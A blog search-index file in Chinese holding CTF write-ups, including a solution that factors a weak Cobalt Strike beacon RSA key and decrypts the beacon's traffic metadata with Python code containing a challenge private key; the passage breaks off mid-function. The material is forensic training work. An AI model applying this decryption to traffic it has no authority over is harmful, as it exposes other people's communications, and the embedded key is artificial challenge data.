<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>RDCTF2025 Writeup</title>
      <link href="/2025/01/25/RDCTF2025-Writeup/"/>
      <url>/2025/01/25/RDCTF2025-Writeup/</url>
      
        <content type="html"><![CDATA[<p>学弟出题的比赛，拿了个第一名来给学弟捧个场:)</p><p><a href="https://www.blog.st4rr.top/writeups/RDCTF2025Writeup.pdf">Writeup</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> RDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西湖论剑2025 Misc Writeup+复现</title>
      <link href="/2025/01/24/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/01/24/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><h3 id="糟糕的磁盘"><a href="#糟糕的磁盘" class="headerlink" title="糟糕的磁盘"></a>糟糕的磁盘</h3><p>取证大师一下子导入五个镜像即可，可以看到key和secret</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/55e2e957-00ec-4d20-a9fd-04bed5f08f21.png" alt="55e2e957-00ec-4d20-a9fd-04bed5f08f21"></p><p>veracrypt挂载一下，key.png当做密钥文件</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/14bc8d87-b159-4a18-8fb8-c6ae9e705112.png" alt="14bc8d87-b159-4a18-8fb8-c6ae9e705112"></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="CSCS"><a href="#CSCS" class="headerlink" title="CSCS"></a>CSCS</h3><blockquote><p>挺逆天的题目，当时比赛的时候是零解。本来前阵子我为了出题专门研究过CS流量，结果这个题中没直接给私钥，也不是已知私钥，也没给镜像什么的，当时就直接给我干懵了。谁知道他这里是要用密码学自己去分解得到私钥。。。不过手撕pem什么的操作我倒是也会。。。好吧还是我菜了:(</p></blockquote><p>可以看到给出了http beacon</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250124144345833.png" alt="image-20250124144345833"></p><p>用1768.py可以拿到公钥</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250124153616367.png" alt="image-20250124153616367"></p><p>当时就是停在这了，根本没想到这个公钥可以分解。。。</p><p>把这串十六进制数做成pem格式，拿到n</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250125161846520.png" alt="image-20250125161846520"></p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250125161928957.png" alt="image-20250125161928957"></p><p>这n可以直接用yafu分解。。。</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250125162015873.png" alt="image-20250125162015873"></p><p>然后做成pem格式的私钥文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_rsa_keys_from_components</span>(<span class="params">p, q, n, e, d</span>):</span><br><span class="line">    private_key = rsa.RSAPrivateNumbers(</span><br><span class="line">        p=p,</span><br><span class="line">        q=q,</span><br><span class="line">        d=d,</span><br><span class="line">        dmp1=d % (p - <span class="number">1</span>),</span><br><span class="line">        dmq1=d % (q - <span class="number">1</span>),</span><br><span class="line">        iqmp=rsa.rsa_crt_iqmp(p, q),</span><br><span class="line">        public_numbers=rsa.RSAPublicNumbers(e=e, n=n),</span><br><span class="line">    ).private_key(backend=default_backend())</span><br><span class="line">    public_key = private_key.public_key()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> public_key, private_key</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_keys_to_pem</span>(<span class="params">public_key, private_key, public_path, private_path</span>):</span><br><span class="line">    public_pem = public_key.public_bytes(</span><br><span class="line">        encoding=serialization.Encoding.PEM,</span><br><span class="line">        <span class="built_in">format</span>=serialization.PublicFormat.SubjectPublicKeyInfo,</span><br><span class="line">    )</span><br><span class="line">    private_pem = private_key.private_bytes(</span><br><span class="line">        encoding=serialization.Encoding.PEM,</span><br><span class="line">        <span class="built_in">format</span>=serialization.PrivateFormat.PKCS8,</span><br><span class="line">        encryption_algorithm=serialization.NoEncryption(),</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(public_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(public_pem)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(private_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(private_pem)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = <span class="number">7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026221</span></span><br><span class="line">    q = <span class="number">7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026527</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e, phi)</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    d = <span class="built_in">int</span>(d)</span><br><span class="line">    public_key, private_key = generate_rsa_keys_from_components(p, q, n, e, d)</span><br><span class="line">    save_keys_to_pem(public_key, private_key, <span class="string">&quot;publicKey.pem&quot;</span>, <span class="string">&quot;privateKey.pem&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;公钥和私钥已成功生成并保存到文件中！&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>接下来就是经典的解密cs流量</p><p>先找到cookie，拿到AES key和HMAC key</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250128153326532.png" alt="image-20250128153326532"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization, hashes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric.padding <span class="keyword">import</span> PKCS1v15</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"></span><br><span class="line">PRIVATE_KEY = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">-----BEGIN PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICdAIBADANBgkqhkiG9w0BAQEFAASCAl4wggJaAgEAAoGAUl4XgfLwLRMqeBim</span></span><br><span class="line"><span class="string">0mm63b85NSyNICkOwilPvk135lSe9HZtiw4WIAAK3716/5nNcvBWI+sN7yAiZc9j</span></span><br><span class="line"><span class="string">HdiVrNXpgdqEJMA6KViVyBlKMWQfLuzVqHFcqJzb+UM8XUN1OHZ2ZsO9sPhilVU3</span></span><br><span class="line"><span class="string">W1dP5AipSugvkpYAhdQWN08WVLMCAwEAAQKBgClZWuu9jZzTNkq79WND+K9BQ/LR</span></span><br><span class="line"><span class="string">vrcaZXJLUuDx+vMCIBoRKcTY+XpvCwZvFMQj7eN5i4TUh1Y4B4yco+FjzR85KDCz</span></span><br><span class="line"><span class="string">q9KuLsJzGcxQQSfcAzDhhLAEhoEaR0ud/F+ltL+RRRv/Pv8DVJG02rWfiFliKecb</span></span><br><span class="line"><span class="string">Y2lS6I7VarAeo4ahAkEAkTXj5VW3w40YhnWoh/hyoCcCa2ic+HIM11hlALQiXE3P</span></span><br><span class="line"><span class="string">KLGj+WeVNzzRveNhQDjDwYZBBl5rvSinhFJ8glXjbQJBAJE14+VVt8ONGIZ1qIf4</span></span><br><span class="line"><span class="string">cqAnAmtonPhyDNdYZQC0IlxNzyixo/lnlTc80b3jYUA4w8GGQQZea70op4RSfIJV</span></span><br><span class="line"><span class="string">5J8CQHq8lC4p77NoNUyhcpvLEgfwMQlcWSFeNSBn5KddmpVuZyU8UR7jwKn5zEa2</span></span><br><span class="line"><span class="string">RGMmF8AhnCCn+mTeUgl0Ny1rL1kCQCGUN64Jw2PqFdjKDn3a2w7j1nBmEZ52KTgH</span></span><br><span class="line"><span class="string">Ddw6y5NSvuvnIEcFSAEtBEeH9C44sjPnStQhM4LbitlThc1R9XsCQCKkR++Zd/hF</span></span><br><span class="line"><span class="string">okuUihZl79eQ1ekZyxgh5p51S/b3Gpo0BsDseESze3C7r4bRA/Vi4A82nbwU2h7n</span></span><br><span class="line"><span class="string">Zd8mFVZPDUM=</span></span><br><span class="line"><span class="string">-----END PRIVATE KEY-----</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">encode_data = <span class="string">&#x27;SLHAIOj8/1icVtP6fImtJz6B6wR0t/XwLg1G0Y3AxoxnseBfPONxoyjAWCCOH84IJULnCZZrO7cIRxJPS2PtmDD4MvD8/PIpoW8Gj8536vhwd+tyXjNKyLNyNYcj+JgO4N5FTnKtkONgv7KnsMjJC3E0eI0ctqmZll8SrXLUS9k=&#x27;</span><span class="comment"># Load the private key</span></span><br><span class="line">private_key = serialization.load_pem_private_key(</span><br><span class="line">    PRIVATE_KEY.encode(),</span><br><span class="line">    password=<span class="literal">None</span>,</span><br><span class="line">    backend=default_backend()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt the data using the private key</span></span><br><span class="line">ciphertext = base64.b64decode(encode_data)</span><br><span class="line">plaintext = private_key.decrypt(</span><br><span class="line">    ciphertext,</span><br><span class="line">    PKCS1v15()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isFlag</span>(<span class="params">var, flag</span>):</span><br><span class="line">    <span class="keyword">return</span> (var &amp; flag) == flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">toIP</span>(<span class="params">var</span>):</span><br><span class="line">    var2 = (var &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">    var4 = (var &amp; <span class="number">0x00FF0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">    var6 = (var &amp; <span class="number">0x0000FF00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">    var8 = var &amp; <span class="number">0x000000FF</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var2&#125;</span>.<span class="subst">&#123;var4&#125;</span>.<span class="subst">&#123;var6&#125;</span>.<span class="subst">&#123;var8&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getName</span>(<span class="params">var0</span>):</span><br><span class="line">    <span class="comment"># Your existing getName function remains unchanged</span></span><br><span class="line">    <span class="keyword">if</span> var0 == <span class="number">37</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM037&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">437</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM437&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">500</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM500&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">708</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-6&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">709</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">710</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">720</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM437&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">737</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM737&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">775</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM775&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">850</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM850&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">852</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM852&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">855</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM855&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">857</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM857&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">858</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM00858&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">860</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM860&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">861</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM861&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">862</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM862&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">863</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM863&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">864</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM864&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">865</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM865&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">866</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM866&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">869</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM869&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">870</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM870&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">874</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-windows-874&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">875</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM875&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">932</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Shift_JIS&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-mswin-936&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">949</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-windows-949&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">950</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Big5&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1026</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM1026&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1047</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM1047&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1140</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01140&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1141</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01141&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1142</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01142&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1143</span>:</span><br><span class="line">        <span class="keyword">return</span> <span 